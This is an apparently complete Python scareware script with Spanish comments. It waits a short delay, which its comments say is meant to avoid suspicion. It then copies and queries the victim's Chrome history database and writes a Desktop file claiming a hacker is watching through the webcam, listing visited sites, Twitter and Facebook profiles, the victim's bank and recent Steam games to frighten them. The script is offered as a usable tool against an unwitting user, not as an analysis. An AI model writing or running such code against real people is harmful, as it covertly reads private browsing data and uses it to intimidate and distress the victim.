import os
import re
import sqlite3
from pathlib import Path
from shutil import copyfile
from time import sleep
from random import randrange
import glob

HACKER_FILE_NAME = "PARA TI.txt"


def check_steam_games(hacker_file):
    steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common"
    games = []
    game_paths = glob.glob(steam_path)
    game_paths.sort(key=os.path.getmtime, reverse=True)
    for game_path in game_paths:
        games.append(game_path.split("\\")[-1])
    hacker_file.write("He visto que has estado jugando últimamente a {}… Jajaja".format(", ".join(games[:3])))


def get_user_path():
    return f"{Path.home()}/"


def delay_action():
    n_hours = randrange(1, 4)
    print(f"Durmiendo {n_hours}")
    sleep(randrange(1, 4))


def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
    hacker_file.write("Hola, soy un haaker y puedo observarte por la cámara. Te ves bien hoy.\n")
    return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            print(urls)
            connection.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible. Reintentando en 3 segundos")
            sleep(3)


def check_twitter_profiles_and_scare_users(hacker_file, chrome_hitory):
    profiles_visited = []
    for item in chrome_hitory[:10]:
        hacker_file.write(f"He visto que has visitado la web de {item[0]}, interesante…\n")
        results = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notificatios", "home"]:
            profiles_visited.append(results[0])
    hacker_file.write("He visto que has estado husmeando en los perfiles de {}…\n".format(", ".join(profiles_visited)))


def check_facebook_profiles_and_scare_users(hacker_file, chrome_hitory):
    profiles_visited = []
    for item in chrome_hitory[:10]:
        hacker_file.write(f"He visto que has visitado la web de {item[0]}, interesante…\n")
        results = re.findall("https://facebook.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notificatios", "home"]:
            profiles_visited.append(results[0])
    hacker_file.write("He visto que has estado husmeando en los perfiles de {}…\n".format(", ".join(profiles_visited)))


def check_bank_account(hacker_file, chrome_hitory):
    his_bank = None
    banks = ["BBVA", "Santander", "Banco Azteca", "Banamex", "Banorte", "HSBC"]
    for item in chrome_hitory:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break
    hacker_file.write("Además, veo que guardas el dinero en {}… Interesante\n".format(his_bank))


def main():
    # Esperaremos entre una y tres horas para no levantar sospechas
    delay_action()
    # Calculamos la ruta de usuario de Windows
    user_path = get_user_path()
    # Recogemos su historial de Chrome cuando sea posible
    chrome_hitory = get_chrome_history(user_path)
    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)
    # Escribiendo mensajes de miedo
    check_twitter_profiles_and_scare_users(hacker_file, chrome_hitory)
    check_facebook_profiles_and_scare_users(hacker_file, chrome_hitory)
    check_bank_account(hacker_file, chrome_hitory)
    check_steam_games(hacker_file)


if __name__ == '__main__':
    main()
